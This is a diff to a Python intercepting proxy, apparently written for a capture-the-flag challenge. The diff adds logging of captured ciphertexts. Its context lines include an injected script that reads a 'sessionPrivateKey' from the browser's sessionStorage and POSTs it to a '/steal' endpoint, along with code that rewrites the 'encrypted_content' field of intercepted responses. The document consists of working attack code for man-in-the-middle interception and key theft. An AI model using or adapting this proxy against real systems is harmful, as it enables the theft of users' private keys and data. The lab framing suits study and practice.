@@ -10,6 +10,7 @@ LISTEN_HOST = "0.0.0.0"
 LISTEN_PORT = 1500
 LOG_PATH = "/tmp/proxy/captured.log"
 FLAG_PATH = "/tmp/proxy/stolen_flag.txt"
+CIPHERS_PATH = "/tmp/proxy/ciphertexts.log"
 INJECT_SNIPPET = (
     "</pre><script>(async()=>{try{const key=sessionStorage.getItem('sessionPrivateKey');"
     "if(!key)return;await fetch('/steal',{method:'POST',headers:{'Content-Type':'application/json'},"
@@ -18,6 +19,7 @@ INJECT_SNIPPET = (
 
 log_lock = threading.Lock()
 flag_lock = threading.Lock()
+cipher_lock = threading.Lock()
 
 
 def log(message):
@@ -32,6 +34,13 @@ def save_flag(text):
         with open(FLAG_PATH, 'a') as fh:
             fh.write(f"{datetime.datetime.utcnow().isoformat()} {text}\n")
         log(f"Captured flag snippet: {text[:40]}...")
+
+
+def save_ciphertext(text):
+    with cipher_lock:
+        with open(CIPHERS_PATH, 'a') as fh:
+            fh.write(f"{datetime.datetime.utcnow().isoformat()} {text}\n")
+        log(f"Captured ciphertext snippet: {text[:40]}...")
 
 
 def recv_until(sock, delimiter):
@@ -132,6 +141,7 @@ def modify_flag_response(body):
     ciphertext = data.get('encrypted_content')
     if not ciphertext:
         return body
+    save_ciphertext(ciphertext)
     data['encrypted_content'] = build_json_payload(ciphertext)
     return json.dumps(data).encode()
 
